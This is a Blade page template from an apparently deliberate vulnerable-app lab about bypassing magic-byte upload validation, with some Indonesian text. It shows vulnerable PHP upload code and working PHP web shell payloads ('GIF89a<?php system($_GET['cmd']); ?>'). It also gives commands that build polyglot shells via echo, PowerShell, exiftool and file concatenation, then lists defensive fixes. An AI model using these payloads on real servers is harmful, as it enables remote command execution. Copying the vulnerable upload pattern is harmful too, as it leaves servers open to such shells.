@extends('layouts.app')

@section('title', 'Level 5: Magic Bytes Bypass')

@section('content')
<div class="container-fluid py-4">
    {{-- Header --}}
    <div class="d-flex justify-content-between align-items-center mb-4">
        <div>
            <h2 class="mb-1">
                <span class="badge bg-success me-2">Level 5</span>
                Magic Bytes Validation (Polyglot Attack)
            </h2>
            <p class="text-muted mb-0">File content validation - harder but still bypassable!</p>
        </div>
        <div>
            <a href="{{ route('file-upload-lab.vulnerable.index') }}" class="btn btn-outline-secondary">
                <i class="bi bi-arrow-left"></i> Back to Lab
            </a>
        </div>
    </div>

    <div class="row">
        {{-- Upload Form --}}
        <div class="col-lg-6 mb-4">
            <div class="card border-success">
                <div class="card-header bg-success text-white">
                    <h5 class="mb-0"><i class="bi bi-cloud-upload"></i> Magic Bytes Protected Upload</h5>
                </div>
                <div class="card-body">
                    {{-- Show info --}}
                    <div class="alert alert-success py-2 mb-3">
                        <strong>Validation:</strong> File content magic bytes checked with <code>finfo</code>
                    </div>

                    <form action="{{ route('file-upload-lab.vulnerable.level5') }}" method="POST" enctype="multipart/form-data">
                        @csrf

                        <div class="mb-3">
                            <label class="form-label">Select Image File</label>
                            <input type="file" name="file" class="form-control" required>
                            <div class="form-text">
                                <i class="bi bi-shield-check text-success"></i>
                                File content is validated using magic bytes detection
                            </div>
                        </div>

                        <button type="submit" class="btn btn-success">
                            <i class="bi bi-upload"></i> Upload File
                        </button>
                    </form>

                    @if(isset($error))
                        <div class="alert alert-danger mt-3 mb-0">
                            <i class="bi bi-x-circle"></i> {{ $error }}
                        </div>
                    @endif

                    @if(isset($detectedMime))
                        <div class="alert alert-info mt-3 mb-0">
                            <i class="bi bi-info-circle"></i>
                            <strong>Detected MIME:</strong> {{ $detectedMime }}
                        </div>
                    @endif

                    @if(isset($message))
                        <div class="alert alert-success mt-3 mb-0">
                            <i class="bi bi-check-circle"></i> {{ $message }}
                            @if(isset($fileUrl))
                                <br>
                                <strong>URL:</strong>
                                <a href="{{ $fileUrl }}" target="_blank">{{ $fileUrl }}</a>
                            @endif
                        </div>
                    @endif
                </div>
            </div>

            {{-- Vulnerable Code --}}
            <div class="card mt-4">
                <div class="card-header bg-dark text-white">
                    <h6 class="mb-0"><i class="bi bi-code-slash"></i> Vulnerable Code</h6>
                </div>
                <div class="card-body bg-dark">
<pre class="text-light mb-0 small"><code><span class="text-secondary">// BETTER: Check magic bytes from content</span>
$finfo = <span class="text-primary">new</span> finfo(FILEINFO_MIME_TYPE);
$detectedMime = $finfo->file($file->getPathname());

<span class="text-primary">if</span> (!in_array($detectedMime, $allowedMimeTypes)) {
    <span class="text-primary">return</span> <span class="text-success">'Invalid file content!'</span>;
}

<span class="text-secondary">// STILL VULNERABLE:</span>
<span class="text-secondary">// 1. Keeps original filename (shell.php)</span>
<span class="text-secondary">// 2. Polyglot files can have valid image header</span>
<span class="text-secondary">//    followed by PHP code</span>
$file->move(public_path(<span class="text-success">'uploads'</span>), $originalName);</code></pre>
                </div>
            </div>
        </div>

        {{-- Bypass Instructions --}}
        <div class="col-lg-6 mb-4">
            <div class="card border-danger h-100">
                <div class="card-header bg-danger text-white">
                    <h5 class="mb-0"><i class="bi bi-unlock"></i> Polyglot File Attack</h5>
                </div>
                <div class="card-body">
                    <h6>What is a Polyglot File?</h6>
                    <p class="small">
                        File yang <strong>valid sebagai image DAN executable sebagai PHP</strong>.
                        Dimulai dengan magic bytes image, diikuti PHP code.
                    </p>

                    <h6>Method 1: GIF89a Polyglot</h6>
                    <p class="small">GIF adalah format paling mudah karena magic bytes-nya plain text:</p>
                    <div class="bg-dark text-light p-2 rounded small mb-3">
<pre class="mb-0"><code><span class="text-warning">GIF89a</span>&lt;?php system($_GET['cmd']); ?&gt;

<span class="text-secondary">// Save as: shell.php</span>
<span class="text-secondary">// Magic bytes "GIF89a" makes it valid GIF</span>
<span class="text-secondary">// But Apache executes it as PHP!</span></code></pre>
                    </div>

                    <h6>Create GIF Polyglot (Linux/Mac):</h6>
                    <div class="bg-dark text-light p-2 rounded small mb-3">
<pre class="mb-0"><code>echo -e "GIF89a&lt;?php system(\$_GET['cmd']); ?&gt;" > shell.php</code></pre>
                    </div>

                    <h6>Create GIF Polyglot (Windows PowerShell):</h6>
                    <div class="bg-dark text-light p-2 rounded small mb-3">
<pre class="mb-0"><code>Set-Content -Path shell.php -Value "GIF89a&lt;?php system(`$_GET['cmd']); ?&gt;"</code></pre>
                    </div>

                    <h6>Method 2: PNG/JPEG with Exif</h6>
                    <p class="small">Inject PHP code ke EXIF metadata:</p>
                    <div class="bg-dark text-light p-2 rounded small mb-3">
<pre class="mb-0"><code><span class="text-secondary"># Using exiftool</span>
exiftool -Comment="&lt;?php system(\$_GET['cmd']); ?&gt;" image.jpg
mv image.jpg shell.php</code></pre>
                    </div>

                    <h6>Method 3: Append to Real Image</h6>
                    <div class="bg-dark text-light p-2 rounded small mb-3">
<pre class="mb-0"><code><span class="text-secondary"># Linux:</span>
cat real_image.jpg > shell.php
echo "&lt;?php system(\$_GET['cmd']); ?&gt;" >> shell.php

<span class="text-secondary"># Windows:</span>
copy /b real_image.jpg + payload.php shell.php</code></pre>
                    </div>

                    @if(isset($fileUrl) && str_ends_with($uploadedFile ?? '', '.php'))
                        <div class="alert alert-danger mt-3 mb-0">
                            <h6><i class="bi bi-terminal"></i> Test Shell:</h6>
                            <a href="{{ $fileUrl }}?cmd=whoami" target="_blank" class="text-danger small">
                                {{ $fileUrl }}?cmd=whoami
                            </a>
                        </div>
                    @endif
                </div>
            </div>
        </div>
    </div>

    {{-- Magic Bytes Reference --}}
    <div class="card mb-4">
        <div class="card-header bg-info text-white">
            <h5 class="mb-0"><i class="bi bi-file-binary"></i> Common Magic Bytes Reference</h5>
        </div>
        <div class="card-body">
            <div class="table-responsive">
                <table class="table table-bordered small">
                    <thead class="table-info">
                        <tr>
                            <th>Format</th>
                            <th>Magic Bytes (Hex)</th>
                            <th>Magic Bytes (ASCII)</th>
                            <th>Notes</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>GIF</td>
                            <td><code>47 49 46 38 39 61</code></td>
                            <td><code>GIF89a</code></td>
                            <td class="text-success">Easiest for polyglot!</td>
                        </tr>
                        <tr>
                            <td>PNG</td>
                            <td><code>89 50 4E 47 0D 0A 1A 0A</code></td>
                            <td><code>‰PNG....</code></td>
                            <td>Binary chars</td>
                        </tr>
                        <tr>
                            <td>JPEG</td>
                            <td><code>FF D8 FF E0</code></td>
                            <td><code>ÿØÿà</code></td>
                            <td>Binary chars</td>
                        </tr>
                        <tr>
                            <td>PDF</td>
                            <td><code>25 50 44 46 2D</code></td>
                            <td><code>%PDF-</code></td>
                            <td>Can also be polyglot</td>
                        </tr>
                        <tr>
                            <td>ZIP</td>
                            <td><code>50 4B 03 04</code></td>
                            <td><code>PK..</code></td>
                            <td>Also .docx, .xlsx</td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    {{-- Lesson Learned --}}
    <div class="card">
        <div class="card-header bg-warning text-dark">
            <h5 class="mb-0"><i class="bi bi-mortarboard"></i> Lesson Learned & Complete Solution</h5>
        </div>
        <div class="card-body">
            <p>Magic bytes validation SAJA tidak cukup! Butuh <strong>multiple layers of defense:</strong></p>

            <div class="row">
                <div class="col-md-6">
                    <h6 class="text-danger">Remaining Vulnerabilities:</h6>
                    <ul class="small">
                        <li>Original filename preserved (allows .php extension)</li>
                        <li>Stored in public directory (directly accessible)</li>
                        <li>No re-processing of image content</li>
                    </ul>
                </div>
                <div class="col-md-6">
                    <h6 class="text-success">Complete Solution:</h6>
                    <ol class="small">
                        <li>✅ Whitelist extensions (not blacklist)</li>
                        <li>✅ Check magic bytes</li>
                        <li>✅ <strong>Generate random filename</strong></li>
                        <li>✅ <strong>Store OUTSIDE public directory</strong></li>
                        <li>✅ Serve via controller with auth check</li>
                        <li>✅ Re-process images (strip metadata)</li>
                    </ol>
                </div>
            </div>

            <div class="alert alert-success mt-3 mb-0">
                <i class="bi bi-arrow-right"></i>
                <strong>Next:</strong> Lihat implementasi yang aman di
                <a href="{{ route('file-upload-lab.secure.index') }}" class="alert-link">Secure Implementation</a>
            </div>
        </div>
    </div>
</div>
@endsection
